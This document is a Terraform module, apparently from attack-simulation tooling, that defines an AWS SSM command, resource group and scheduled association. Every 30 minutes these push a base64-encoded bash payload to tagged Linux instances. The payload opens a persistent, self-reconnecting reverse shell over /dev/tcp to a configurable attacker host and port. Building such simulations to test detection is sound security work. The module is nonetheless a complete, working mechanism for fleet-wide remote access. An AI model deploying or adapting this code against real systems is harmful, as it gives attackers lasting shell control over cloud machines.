locals {
    host_ip = var.host_ip
    host_port = var.host_port

    payload = <<-EOT
    LOGFILE=/tmp/ssm_attacker_exec_reverseshell_target.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "attacker Host: ${local.host_ip}:${local.host_port}"
    kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
    log "running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
    while true; do
        log "reconnecting: ${local.host_ip}:${local.host_port}"
        while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
            log "reconnecting: ${local.host_ip}:${local.host_port}";
            sleep 10;
        done;
        log "disconnected - wait retry...";
        sleep 60;
        log "starting retry...";
    done
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

resource "aws_ssm_document" "exec_reverse_shell_target" {
  name          = "exec_reverse_shell_${var.environment}_${var.deployment}"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "exec reverse shell target",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_reverse_shell_${var.environment}_${var.deployment}",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "600",
                    "runCommand": [
                        "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_reverse_shell_target" {
    name = "exec_reverse_shell_${var.environment}_${var.deployment}"

    resource_query {
        query = jsonencode(var.resource_query_exec_reverse_shell_target)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_reverse_shell_target" {
    association_name = "exec_reverse_shell_${var.environment}_${var.deployment}"

    name = aws_ssm_document.exec_reverse_shell_target.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_reverse_shell_target.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}